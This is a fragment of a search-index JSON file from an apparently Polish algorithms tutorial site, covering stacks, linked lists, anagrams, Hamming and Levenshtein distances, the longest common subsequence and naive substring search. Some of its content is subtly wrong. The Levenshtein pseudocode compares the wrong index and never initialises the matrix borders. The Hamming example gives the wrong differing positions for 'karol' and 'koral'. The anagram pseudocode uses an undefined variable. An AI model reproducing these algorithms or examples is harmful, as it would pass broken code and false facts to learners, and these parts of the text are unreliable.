</ul>"},{"location":"algorithms/structures/singly-linked-list/#zastosowania","title":"Zastosowania","text":"<p>Listy jednokierunkowe s\u0105 wykorzystywane w wielu algorytmach i strukturach danych, takich jak stosy, kolejki, hashowanie \u0142a\u0144cuchowe itp. S\u0105 one szczeg\u00f3lnie przydatne w sytuacjach, gdzie elementy s\u0105 dodawane i usuwane tylko z jednego ko\u0144ca sekwencji, jak na przyk\u0142ad w implementacji stosu.</p>"},{"location":"algorithms/structures/singly-linked-list/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/structures/singly-linked-list/#c","title":"C++","text":""},{"location":"algorithms/structures/singly-linked-list/#python","title":"Python","text":""},{"location":"algorithms/structures/stack/","title":"Stos","text":"<p>Stos (ang. Stack) jest podstawow\u0105 struktur\u0105 danych, kt\u00f3ra organizuje elementy w spos\u00f3b liniowy, przypominaj\u0105cy stos lub kolumn\u0119. Wyr\u00f3\u017cnia go szczeg\u00f3lne zachowanie znane jako zasada LIFO (ang. Last In, First Out), co oznacza, \u017ce ostatni element dodany do stosu b\u0119dzie pierwszym elementem usuni\u0119tym ze stosu.</p> <p>Stos obs\u0142uguje dwie g\u0142\u00f3wne operacje:</p> <ul> <li>Push: dodaje element na szczyt stosu.</li> <li>Pop: usuwa element ze szczytu stosu.</li> </ul> <p>Niekt\u00f3re implementacje stosu mog\u0105 r\u00f3wnie\u017c obs\u0142ugiwa\u0107 dodatkowe operacje, takie jak:</p> <ul> <li>Peek / Top: zwraca element na szczycie stosu bez usuwania go.</li> <li>IsEmpty: sprawdza, czy stos jest pusty.</li> <li>Size: zwraca liczb\u0119 element\u00f3w na stosie.</li> </ul>"},{"location":"algorithms/structures/stack/#zastosowania","title":"Zastosowania","text":"<p>Stosy s\u0105 wykorzystywane w wielu r\u00f3\u017cnych kontekstach w informatyce, w tym:</p> <ul> <li>Wywo\u0142anie funkcji: kiedy funkcja \\(A\\) wywo\u0142uje inn\u0105 funkcj\u0119 \\(B\\), aktualny stan funkcji \\(A\\) jest umieszczany na stosie, a funkcja \\(B\\) jest wykonywana. Gdy funkcja \\(B\\) zako\u0144czy dzia\u0142anie, stan funkcji \\(A\\) jest zdejmowany ze stosu, co umo\u017cliwia powr\u00f3t do miejsca, w kt\u00f3rym zosta\u0142a przerwana.</li> <li>Odwracanie sekwencji: elementy dodane do stosu b\u0119d\u0105 zdejmowane w odwrotnej kolejno\u015bci, dzi\u0119ki czemu stosy s\u0105 u\u017cyteczne do odwracania sekwencji.</li> <li>Sprawdzanie zr\u00f3wnowa\u017cenia nawias\u00f3w: stosy mog\u0105 by\u0107 u\u017cywane do sprawdzania zr\u00f3wnowa\u017cenia nawias\u00f3w w wyra\u017ceniach matematycznych lub kodzie programu.</li> <li>Algorytmy wykorzystuj\u0105ce backtracking: takie jak algorytmy przeszukiwania przestrzeni stan\u00f3w (np. labiryntu), algorytmy przeszukiwania grafu (DFS), algorytmy rozwi\u0105zywania problem\u00f3w zwi\u0105zanych z permutacjami i kombinacjami.</li> </ul> <p>Stosy s\u0105 wi\u0119c fundamentalnym narz\u0119dziem w informatyce, maj\u0105cym szerokie zastosowanie zar\u00f3wno w teorii jak i praktyce.</p>"},{"location":"algorithms/structures/stack/#implementacja","title":"Implementacja","text":"<p>Stosy mog\u0105 by\u0107 zaimplementowane za pomoc\u0105 r\u00f3\u017cnych struktur danych, takich jak tablice lub listy po\u0142\u0105czone. Wyb\u00f3r konkretnej struktury danych do implementacji stosu zale\u017cy od konkretnych wymaga\u0144, takich jak efektywno\u015b\u0107 operacji, u\u017cycie pami\u0119ci, czy \u0142atwo\u015b\u0107 implementacji.</p> <p>Poni\u017cej znajdziesz przyk\u0142adowe implementacje stosu w wybranych j\u0119zykach programowania.</p>"},{"location":"algorithms/structures/stack/#c","title":"C++","text":""},{"location":"algorithms/structures/stack/#python","title":"Python","text":""},{"location":"algorithms/structures/stack/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/structures/stack/#_1","title":"Stos","text":""},{"location":"algorithms/text/","title":"Algorytmy na tekstach","text":"<p>Algorytmy na tekstach to kluczowy obszar informatyki, kt\u00f3ry zajmuje si\u0119 efektywnym przetwarzaniem, wyszukiwaniem i manipulowaniem danymi tekstowymi. To pole jest niezwykle istotne dla takich dziedzin jak analiza danych, przetwarzanie j\u0119zyka naturalnego, bioinformatyka i wiele innych.</p> <p>Podstawowe zagadnienia dotycz\u0105ce algorytm\u00f3w na tekstach obejmuj\u0105:</p> <ol> <li>Algorytmy wyszukiwania wzorc\u00f3w w tek\u015bcie: wykorzystywane do wyszukiwania wyst\u0105pie\u0144 okre\u015blonego wzorca w wi\u0119kszym tek\u015bcie. Popularne algorytmy wyszukiwania wzorc\u00f3w obejmuj\u0105 algorytm Knutha-Morrisa-Pratta (KMP), algorytm Boyera-Moorea i algorytm Rabina-Karpa.</li> <li>Algorytmy dopasowywania wzorc\u00f3w: u\u017cywane do por\u00f3wnywania dw\u00f3ch tekst\u00f3w i ustalania, jak bardzo s\u0105 podobne. Algorytmy dopasowywania wzorc\u00f3w s\u0105 kluczowe dla takich zastosowa\u0144 jak wykrywanie plagiatu, por\u00f3wnywanie sekwencji DNA i t\u0142umaczenie maszynowe. Przyk\u0142adem takiego algorytmu jest algorytm Needleman-Wunsch czy te\u017c obliczanie odleg\u0142o\u015bci edycyjnej.</li> <li>Algorytmy sortowania tekst\u00f3w: u\u017cywane do organizowania danych tekstowych w okre\u015blonym porz\u0105dku. Przyk\u0142adem mo\u017ce by\u0107 tu algorytm sortowania leksykograficznego.</li> <li>Algorytmy kompresji tekstu: wykorzystywane do redukcji rozmiaru danych tekstowych bez utraty informacji. Algorytmy kompresji tekstu s\u0105 kluczowe dla takich zastosowa\u0144 jak archiwizacja danych, transmisja danych i przechowywanie danych. Przyk\u0142ady to algorytm Lempel-Ziv-Welch (LZW) i algorytm Huffmana.</li> <li>Algorytmy przetwarzania j\u0119zyka naturalnego (NLP): NLP to dziedzina informatyki skupiaj\u0105ca si\u0119 na interakcji mi\u0119dzy komputerami a lud\u017ami za pomoc\u0105 j\u0119zyka naturalnego. Algorytmy NLP s\u0105 u\u017cywane do analizy sentymentu, t\u0142umaczenia maszynowego, rozpoznawania mowy i innych zastosowa\u0144. Przyk\u0142ady to algorytmy tokenizacji, stemmingu i lematyzacji.</li> </ol> <p>Dla wszystkich powy\u017cszych zagadnie\u0144, kluczowe jest zrozumienie, jak dane tekstowe s\u0105 reprezentowane w komputerze, a tak\u017ce jak r\u00f3\u017cne algorytmy dzia\u0142aj\u0105 i jakie maj\u0105 zalety i wady. Wymaga to dobrej znajomo\u015bci struktur danych, z\u0142o\u017cono\u015bci obliczeniowej i innych podstawowych temat\u00f3w informatyki.</p>"},{"location":"algorithms/text/anagrams/","title":"Anagramy","text":"<p>Istnieje wiele metod na sprawdzanie i tworzenie relacji pomi\u0119dzy wyrazami. W tym temacie zajmiemy si\u0119 poj\u0119ciem anagramu, kt\u00f3re mo\u017ce by\u0107 znane szczeg\u00f3lnie osobom przejawiaj\u0105cym zami\u0142owanie do r\u00f3\u017cnego rodzaju krzy\u017c\u00f3wek i zagadek s\u0142ownych. Zacznijmy od kr\u00f3tkiej definicji.</p>"},{"location":"algorithms/text/anagrams/#definicja","title":"Definicja","text":"<p>Info</p> <p>Dwa wyrazy nazywamy anagramami, je\u017celi sk\u0142adaj\u0105 si\u0119 dok\u0142adnie z takich samych znak\u00f3w, ale u\u0142o\u017conych w innej kolejno\u015bci.</p>"},{"location":"algorithms/text/anagrams/#link-do-wikipedii","title":"Link do Wikipedii","text":"<p>Anagram \u2014 Wikipedia</p>"},{"location":"algorithms/text/anagrams/#przykad","title":"Przyk\u0142ad","text":"<p>Wyrazy r\u017cy i ry\u017c s\u0105 anagramami. Podobnie wyrazy algorytm i logarytm.</p> <p>Nie tylko wyrazy mog\u0105 by\u0107 anagramami, ale tak\u017ce wyra\u017cenia czy ca\u0142e zdania.</p>"},{"location":"algorithms/text/anagrams/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/anagrams/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, d\u0142ugo\u015b\u0107 tekstu.</li> <li>\\(tekst1[1..n]\\) \u2014 ci\u0105g \\(n\\) znak\u00f3w, numerowanych od jedynki, sk\u0142adaj\u0105cy si\u0119 wy\u0142\u0105cznie z ma\u0142ych liter alfabetu angielskiego.</li> <li>\\(tekst2[1..n]\\) \u2014 ci\u0105g \\(n\\) znak\u00f3w, numerowanych od jedynki, sk\u0142adaj\u0105cy si\u0119 wy\u0142\u0105cznie z ma\u0142ych liter alfabetu angielskiego.</li> </ul> <p>Info</p> <p>W og\u00f3lnym problemie mogliby\u015bmy sprawdza\u0107 w\u0142asno\u015b\u0107 anagramu dla dowolnych ci\u0105g\u00f3w znak\u00f3w, w szczeg\u00f3lno\u015bci zawieraj\u0105cych tak\u017ce wielkie litery alfabetu. Skupimy si\u0119 jednak na uproszczonej wersji tego problemu, by przedstawi\u0107 ide\u0119 rozwi\u0105zania, a technikalia zostawiamy osobom zainteresowanym.</p>"},{"location":"algorithms/text/anagrams/#wynik","title":"Wynik","text":"<ul> <li>\\(PRAWDA\\) \u2014 je\u017celi \\(tekst1\\) i \\(tekst2\\) s\u0105 anagramami.</li> <li>\\(FA\u0141SZ\\) \u2014 w przeciwnym przypadku.</li> </ul>"},{"location":"algorithms/text/anagrams/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"algorithms/text/anagrams/#dane_1","title":"Dane","text":"<pre><code>n := 8\ntekst1 := \"markotny\"\ntekst2 := \"romantyk\"\n</code></pre> <p>Wynik: PRAWDA</p>"},{"location":"algorithms/text/anagrams/#rozwiazanie-1","title":"Rozwi\u0105zanie 1","text":""},{"location":"algorithms/text/anagrams/#opis","title":"Opis","text":"<p>Aby dwa wyrazy by\u0142y anagramami, musz\u0105 sk\u0142ada\u0107 si\u0119 dok\u0142adnie z takich samych liter.  Oznacza to tak\u017ce, \u017ce ka\u017cda litera z pierwszego wyrazu musi pojawi\u0107 si\u0119 w drugim wyrazie dok\u0142adnie tyle samo razy i tak samo w drug\u0105 stron\u0119.  W zwi\u0105zku z tym pierwsze rozwi\u0105zanie jest proste: policzmy, ile razy ka\u017cda litera wyst\u0119puje w pierwszym wyrazie, nast\u0119pnie zr\u00f3bmy to samo dla drugiego wyrazu i por\u00f3wnajmy wyniki.  Je\u017celi b\u0119d\u0105 takie same, to dwa wyrazy s\u0105 anagramami.</p> <p>Jak jednak policzy\u0107, ile razy dana litera wyst\u0119puje w wyrazie?  Zauwa\u017cmy, \u017ce nasze wyrazy sk\u0142adaj\u0105 si\u0119 jedynie z ma\u0142ych liter alfabetu angielskiego.  Oznacza to, \u017ce mamy dok\u0142adnie 26 znak\u00f3w.  Mo\u017cemy wi\u0119c przygotowa\u0107 tablic\u0119 przechowuj\u0105c\u0105 26 licznik\u00f3w \u2014 po jednym dla ka\u017cdej litery.  Litery natomiast ponumerujemy od 1, startuj\u0105c od \\(a\\).  Liczb\u0119 wyst\u0105pie\u0144 litery \\(a\\) zapiszemy w pierwszym liczniku, liczb\u0119 wyst\u0105pie\u0144 litery \\(b\\) zapiszemy w drugim liczniku itd.</p>"},{"location":"algorithms/text/anagrams/#przykad_2","title":"Przyk\u0142ad","text":"<p>Przyjmijmy takie same dane jak we wcze\u015bniejszym przyk\u0142adzie, tzn.:</p> <pre><code>n := 8\ntekst1 := \"markotny\"\ntekst2 := \"romantyk\"\n</code></pre> <p>Zaczynamy od policzenia tablic licznik\u00f3w dla pierwszego i drugiego wyrazu. Dla czytelno\u015bci zapiszemy je w zmodyfikowanej formie, do ka\u017cdego licznika dopisuj\u0105c odpowiadaj\u0105c\u0105 mu liter\u0119. Tak oto otrzymujemy tablice licznik\u00f3w odpowiednio dla pierwszego i drugiego wyrazu:</p> <pre><code>liczniki1 = [a:1, b:0, c:0, d:0, e:0, f:0, g:0, h:0, i:0, j:0, k:1, l:0, m:1, n:1, o:1, p:0, q:0, r:1, s:0, t:1, u:0, v:0, w:0, x:0, y:1, z:0]\nliczniki2 = [a:1, b:0, c:0, d:0, e:0, f:0, g:0, h:0, i:0, j:0, k:1, l:0, m:1, n:1, o:1, p:0, q:0, r:1, s:0, t:1, u:0, v:0, w:0, x:0, y:1, z:0]\n</code></pre> <p>Gdy je por\u00f3wnamy zobaczymy, \u017ce s\u0105 sobie r\u00f3wne. Oznacza to, \u017ce nasze wyrazy s\u0105 anagramami.</p>"},{"location":"algorithms/text/anagrams/#pseudokod","title":"Pseudokod","text":"<p>Spr\u00f3bujmy teraz zapisa\u0107 nasze rozwi\u0105zanie w bardziej formalny spos\u00f3b. Zaprojektujemy funkcj\u0119 TestujAnagramy, kt\u00f3ra b\u0119dzie przyjmowa\u0107 trzy parametry, zgodnie ze specyfikacj\u0105.</p> <p>Najpierw tworzymy dwie tablice licznik\u00f3w, po jednej dla ka\u017cdego wyrazu. Pocz\u0105tkowo wype\u0142niamy je warto\u015bciami 0, gdy\u017c jeszcze nie przyst\u0105pili\u015bmy do zliczania liter w wyrazach.</p> <p>Gdy tablice s\u0105 gotowe, mo\u017cemy przej\u015b\u0107 do zliczania. Przechodzimy przez oba wyrazy znak po znaku i zwi\u0119kszamy w\u0142a\u015bciwe liczniki w odpowiadaj\u0105cych wyrazom tablicach.</p> <p>Ostatnim krokiem jest por\u00f3wnanie naszych licznik\u00f3w i zwr\u00f3cenie odpowiedniego wyniku.</p> <pre><code>funkcja TestujAnagramy(n, tekst1, tekst2):\n    1. liczniki1 := tablica [1..26] wype\u0142niona warto\u015bciami 0\n    2. liczniki2 := tablica [1..26] wype\u0142niona warto\u015bciami 0\n    3. Od i := 1 do n, wykonuj:\n        4. indeks1 := numer znaku tekst1[i]\n        5. liczniki1[indeks] := liczniki1[indeks] + 1\n        6. indeks2 := numer znaku tekst2[i]\n        7. liczniki2[indeks] := liczniki2[indeks] + 1\n    8. Je\u017celi liczniki1 = liczniki2, to:\n        9. Zwr\u00f3\u0107 PRAWDA\n    10. w przeciwnym przypadku:\n        11. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"algorithms/text/anagrams/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Najbardziej czasoch\u0142onn\u0105 operacj\u0105 w naszym algorytmie jest p\u0119tla przechodz\u0105ca przez ka\u017cdy znak obu wyraz\u00f3w. Znak\u00f3w mamy \\(n\\), wi\u0119c nasza p\u0119tla wykona dok\u0142adnie \\(n\\) obrot\u00f3w, co daje nam z\u0142o\u017cono\u015b\u0107:</p> <p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/text/anagrams/#rozwiazanie-2","title":"Rozwi\u0105zanie 2","text":"<p>Innym rozwi\u0105zaniem jest posortowanie obu wyraz\u00f3w i por\u00f3wnanie ich.</p>"},{"location":"algorithms/text/anagrams/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja TestujAnagramy(n, tekst1, tekst2):\n    1. Sortuj(tekst1)\n    2. Sortuj(tekst2)\n    3. Je\u017celi tekst1 = tekst2, to:\n        4. Zwr\u00f3\u0107 PRAWDA\n    5. w przeciwnym przypadku:\n        6. Zwr\u00f3\u0107 FA\u0141SZ \n</code></pre>"},{"location":"algorithms/text/anagrams/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"TestujAnagramy(n, tekst1, tekst2)\"]) --&gt; K1[\"Sortuj(tekst1)\n    Sortuj(tekst2)\"]\n    K1 --&gt; K3{tekst1 = tekst2}\n    K3 -- PRAWDA --&gt; K4[/Zwr\u00f3\u0107 PRAWDA/]\n    K3 -- FA\u0141SZ --&gt; K6[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K4 --&gt; STOP([STOP])\n    K6 --&gt; STOP</code></pre>"},{"location":"algorithms/text/anagrams/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) \u2014 liniowa, je\u017celi wykorzystamy optymalny algorytm sortowania (np. sortowanie przez zliczanie).</p> <p>\\(O(n\\log{n})\\) \u2014 liniowo logarytmiczna, je\u017celi u\u017cyjemy standardowej metody sortowania (np. sortowanie szybkie).</p>"},{"location":"algorithms/text/anagrams/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/anagrams/#c","title":"C++","text":""},{"location":"algorithms/text/anagrams/#python","title":"Python","text":""},{"location":"algorithms/text/hamming-distance/","title":"Odleg\u0142o\u015b\u0107 Hamminga","text":"<p>Odleg\u0142o\u015b\u0107 Hamminga jest miar\u0105 r\u00f3\u017cnicy mi\u0119dzy dwoma ci\u0105gami o tej samej d\u0142ugo\u015bci. W szczeg\u00f3lno\u015bci jest to liczba pozycji, na kt\u00f3rych odpowiadaj\u0105ce sobie znaki w dw\u00f3ch ci\u0105gach s\u0105 r\u00f3\u017cne. Jest u\u017cywana g\u0142\u00f3wnie w teorii kodowania do mierzenia b\u0142\u0119du i jest u\u017cyteczna w wielu dziedzinach, takich jak korekcja b\u0142\u0119d\u00f3w w systemach komunikacji.</p>"},{"location":"algorithms/text/hamming-distance/#definicja","title":"Definicja","text":"<p>Info</p> <p>Dla dw\u00f3ch ci\u0105g\u00f3w \\(s_1\\) i \\(s_2\\) o tej samej d\u0142ugo\u015bci \\(n\\), odleg\u0142o\u015b\u0107 Hamminga \\(H(s_1, s_2)\\) jest okre\u015blona jako liczba pozycji \\(i\\) dla \\(1 \\leq i \\leq n\\) takich, \u017ce \\(s_1[i] \\neq s_2[i]\\).</p>"},{"location":"algorithms/text/hamming-distance/#przykad","title":"Przyk\u0142ad","text":"<p>Niech <code>s_1 = \"karol\"</code> i <code>s_2 = \"koral\"</code>. Odleg\u0142o\u015b\u0107 Hamminga dla tych ci\u0105g\u00f3w wynosi \\(2\\), poniewa\u017c r\u00f3\u017cni\u0105 si\u0119 one na pozycjach \\(3\\) i \\(5\\).</p>"},{"location":"algorithms/text/hamming-distance/#zastosowania","title":"Zastosowania","text":"<ul> <li>Korekcja b\u0142\u0119d\u00f3w: odleg\u0142o\u015b\u0107 Hamminga mo\u017ce by\u0107 u\u017cywana do korekcji b\u0142\u0119d\u00f3w w systemach komunikacji, jako \u017ce pozwala na wykrywanie i korekcj\u0119 pojedynczych b\u0142\u0119d\u00f3w.</li> <li>Bioinformatyka: odleg\u0142o\u015b\u0107 Hamminga mo\u017ce by\u0107 u\u017cywana do por\u00f3wnywania sekwencji DNA.</li> <li>Kryptografia: w niekt\u00f3rych schematach kryptograficznych odleg\u0142o\u015b\u0107 Hamminga mi\u0119dzy dwoma ci\u0105gami mo\u017ce dostarczy\u0107 informacji o stopniu podobie\u0144stwa tych ci\u0105g\u00f3w, co mo\u017ce by\u0107 u\u017cywane do analizy b\u0142\u0119d\u00f3w lub atak\u00f3w.</li> </ul>"},{"location":"algorithms/text/hamming-distance/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/hamming-distance/#dane","title":"Dane","text":"<ul> <li>\\(s_1\\), \\(s_2\\) - dwa teksty, ci\u0105gi znak\u00f3w liter angielskiego, o tej samej d\u0142ugo\u015bci</li> </ul>"},{"location":"algorithms/text/hamming-distance/#wynik","title":"Wynik","text":"<ul> <li>Odleg\u0142o\u015b\u0107 Hamminga pomi\u0119dzy \\(s_1\\) a \\(s_2\\).</li> </ul>"},{"location":"algorithms/text/hamming-distance/#algorytm","title":"Algorytm","text":""},{"location":"algorithms/text/hamming-distance/#lista-krokow","title":"Lista krok\u00f3w","text":"<ol> <li>Zainicjalizuj licznik na \\(0\\).</li> <li>Dla ka\u017cdej pozycji \\(i\\) w ci\u0105gach:</li> <li>Je\u015bli znaki na pozycji \\(i\\) w obu ci\u0105gach s\u0105 r\u00f3\u017cne, zwi\u0119ksz licznik o \\(1\\).</li> <li>Zwr\u00f3\u0107 warto\u015b\u0107 licznika jako odleg\u0142o\u015b\u0107 Hamminga.</li> </ol>"},{"location":"algorithms/text/hamming-distance/#pseudokod","title":"Pseudokod","text":"<ul> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul> <pre><code>funkcja Odleg\u0142o\u015b\u0107Hamminga(s1, s2):\n    1. wynik := 0\n    2. Dla i := 1 do D\u0142ugo\u015b\u0107(s1), wykonuj:\n        1. Je\u017celi s1[i] != s2[i], to:\n            1. wynik := wynik + 1\n    3. Zwr\u00f3\u0107 wynik\n</code></pre>"},{"location":"algorithms/text/hamming-distance/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu to \\(O(n)\\), gdzie \\(n\\) to d\u0142ugo\u015b\u0107 ci\u0105g\u00f3w.</p>"},{"location":"algorithms/text/hamming-distance/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/hamming-distance/#c","title":"C++","text":""},{"location":"algorithms/text/hamming-distance/#python","title":"Python","text":""},{"location":"algorithms/text/levenshtein-distance/","title":"Odleg\u0142o\u015b\u0107 Levenshteina (edycyjna)","text":"<p>Odleg\u0142o\u015b\u0107 Levenshteina, znana r\u00f3wnie\u017c jako odleg\u0142o\u015b\u0107 edycyjna, jest miar\u0105 r\u00f3\u017cnicy mi\u0119dzy dwoma ci\u0105gami znak\u00f3w. Pozwala okre\u015bli\u0107, jak bardzo dwa wyrazy s\u0105 podobne do siebie, poprzez obliczenie minimalnej liczby operacji wymaganych do przekszta\u0142cenia jednego wyrazu w drugi. Do dozwolonych operacji nale\u017c\u0105: wstawienie (ang. insertion), usuni\u0119cie (ang. deletion) oraz zamiana (ang. substitution) pojedynczego znaku.</p> <p>Odleg\u0142o\u015b\u0107 Levenshteina jest u\u017cywana w wielu dziedzinach, takich jak korekta pisowni, por\u00f3wnywanie sekwencji DNA w biologii, czy systemy rozpoznawania mowy. Jest to przydatne narz\u0119dzie w przetwarzaniu j\u0119zyka naturalnego i innych dziedzinach wymagaj\u0105cych analizy podobie\u0144stwa tekst\u00f3w.</p>"},{"location":"algorithms/text/levenshtein-distance/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Aby przekszta\u0142ci\u0107 wyraz \"kot\" w \"kotek\", nale\u017cy wykona\u0107 dwie operacje:</p> <ul> <li>wstawienie na koniec wyrazu litery \"e\",</li> <li>wstawienie na koniec wyrazu litery \"k\".</li> </ul> <p>Odleg\u0142o\u015b\u0107 Levenshteina dla tekst\u00f3w \"kot\" i \"kotek\" wynosi 2.</p>"},{"location":"algorithms/text/levenshtein-distance/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Aby przekszta\u0142ci\u0107 wyraz \"kotek\" w \"kartek\", nale\u017cy wykona\u0107 dwie operacje:</p> <ul> <li>zamieni\u0107 liter\u0119 \"o\" na \"a\",</li> <li>wstawi\u0107 liter\u0119 \"r\" na trzecim miejscu.</li> </ul> <p>Odleg\u0142o\u015b\u0107 Levenshteina dla tekst\u00f3w \"kotek\" i \"kartek\" wynosi 2.</p>"},{"location":"algorithms/text/levenshtein-distance/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/levenshtein-distance/#dane","title":"Dane","text":"<ul> <li>tekst1, tekst2 - dwa teksty, ci\u0105gi znak\u00f3w liter angielskiego</li> </ul>"},{"location":"algorithms/text/levenshtein-distance/#wynik","title":"Wynik","text":"<ul> <li>Odleg\u0142o\u015b\u0107 Levenshteina pomi\u0119dzy tekst1 a tekst2.</li> </ul>"},{"location":"algorithms/text/levenshtein-distance/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/text/levenshtein-distance/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> <li>Min(a, b, c) - zwraca najmniejsz\u0105 z trzech podanych warto\u015bci</li> </ul>"},{"location":"algorithms/text/levenshtein-distance/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Odleg\u0142o\u015b\u0107Levenshteina(tekst1, tekst2):\n    1. macierz[0..D\u0142ugo\u015b\u0107(tekst1)][0..D\u0142ugo\u015b\u0107[tekst2]] := macierz wype\u0142niona zerami\n    2. Dla i := 1 do D\u0142ugo\u015b\u0107(tekst1), wykonuj:\n        3. Dla j := 1 do D\u0142ugo\u015b\u0107(tekst2), wykonuj:\n            4. Je\u017celi tekst1[i] == tekst2[i], to\n                5. koszt := 0\n            6. w przeciwnym przypadku:\n                7. koszt := 1\n            8. macierz[i][j] = Min(macierz[i - 1][j - 1] + koszt, macierz[i - 1][j] + 1, macierz[i][j - 1] + 1)\n\n    9. Zwr\u00f3\u0107 macierz[D\u0142ugo\u015b\u0107(tekst1)][D\u0142ugo\u015b\u0107(tekst2)]\n</code></pre>"},{"location":"algorithms/text/levenshtein-distance/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/levenshtein-distance/#c","title":"C++","text":""},{"location":"algorithms/text/levenshtein-distance/#python","title":"Python","text":""},{"location":"algorithms/text/longest-common-subsequence/","title":"Najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g","text":"<p>Podci\u0105g to sekwencja znak\u00f3w wybrana z tekstu bez zmiany ich kolejno\u015bci, niekoniecznie znajduj\u0105cych si\u0119 obok siebie. Najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g to problem znalezienia najd\u0142u\u017cszego podci\u0105gu, kt\u00f3ry jest wsp\u00f3lny dla dw\u00f3ch tekst\u00f3w.</p>"},{"location":"algorithms/text/longest-common-subsequence/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/longest-common-subsequence/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwa ci\u0105gi znak\u00f3w</li> </ul>"},{"location":"algorithms/text/longest-common-subsequence/#wynik","title":"Wynik","text":"<ul> <li>Najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g ci\u0105g\u00f3w \\(a\\) i \\(b\\)</li> </ul>"},{"location":"algorithms/text/longest-common-subsequence/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/text/longest-common-subsequence/#dane_1","title":"Dane","text":"<pre><code>a := \"kitten\"\nb := \"sitting\"\n</code></pre>"},{"location":"algorithms/text/longest-common-subsequence/#wynik_1","title":"Wynik","text":"<p><code>\"ittn\"</code></p>"},{"location":"algorithms/text/longest-common-subsequence/#algorytm","title":"Algorytm","text":""},{"location":"algorithms/text/longest-common-subsequence/#lista-krokow","title":"Lista krok\u00f3w","text":"<ol> <li> <p>Utworzenie tabeli: stw\u00f3rz tablic\u0119 o wymiarach <code>(m+1) x (n+1)</code>, gdzie <code>m</code> i <code>n</code> to d\u0142ugo\u015bci dw\u00f3ch por\u00f3wnywanych tekst\u00f3w. Element <code>tab[i][j]</code> b\u0119dzie przechowywa\u0142 d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego wsp\u00f3lnego podci\u0105gu dla kolejnych fragment\u00f3w zadanych tekst\u00f3w: do <code>i-tego</code> znaku pierwszego tekstu i <code>j-tego</code> znaku drugiego tekstu.</p> </li> <li> <p>Inicjalizacja: ustaw wszystkie elementy pierwszej kolumny i pierwszego wiersza na 0.</p> </li> <li> <p>Wype\u0142nienie tabeli:</p> </li> <li> <p>Dla ka\u017cdego <code>i</code> od 1 do <code>m</code> i ka\u017cdego <code>j</code> od 1 do <code>n</code>:</p> <ul> <li>Je\u015bli znaki na pozycji <code>i</code> pierwszego tekstu i pozycji <code>j</code> drugiego tekstu s\u0105 takie same, to <code>tab[i][j] = tab[i-1][j-1] + 1</code>.</li> <li>W przeciwnym przypadku <code>tab[i][j] = max(tab[i - 1][j], tab[i][j - 1])</code>.</li> </ul> </li> <li> <p>Wyznaczenie wyniku:</p> </li> <li>Odczytaj prawy dolny element tablicy - b\u0119dzie to d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego wsp\u00f3lnego podci\u0105gu.</li> <li>W oparciu o warto\u015bci w tablicy odtw\u00f3rz najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g.</li> </ol>"},{"location":"algorithms/text/longest-common-subsequence/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu to <code>O(mn)</code>, gdzie <code>m</code> i <code>n</code> to d\u0142ugo\u015bci analizowanych tekst\u00f3w. Z\u0142o\u017cono\u015b\u0107 pami\u0119ciowa to r\u00f3wnie\u017c <code>O(mn)</code> z uwagi na wymagania tablicy.</p>"},{"location":"algorithms/text/longest-common-subsequence/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/longest-common-subsequence/#c","title":"C++","text":""},{"location":"algorithms/text/longest-common-subsequence/#python","title":"Python","text":""},{"location":"algorithms/text/naive-substring-search/","title":"Naiwne wyszukiwanie wzorca w tek\u015bcie","text":"<p>Problem znalezienia jednego tekstu w drugim to problem, z kt\u00f3rym mamy do czynienia praktycznie na co dzie\u0144, by\u0107 mo\u017ce nawet nie zdaj\u0105c sobie z tego sprawy. Gdy jeste\u015bmy na jakiej\u015b stronie internetowej, albo mamy otwarty dokument tekstowy i wciskamy znany skr\u00f3t CTRL+F, to wtedy w\u0142a\u015bnie wykonujemy przeszukiwanie tekstu w celu znalezienia wyst\u0105pie\u0144 jakiego\u015b zadanego ci\u0105gu znak\u00f3w.</p> <p>Jak niemal\u017ce ka\u017cdy problem (informatyczny), tak\u017ce ten mo\u017cne zosta\u0107 rozwi\u0105zany w spos\u00f3b naiwny i takim w\u0142a\u015bnie rozwi\u0105zaniem pocz\u0105tkowo si\u0119 zajmiemy.</p> 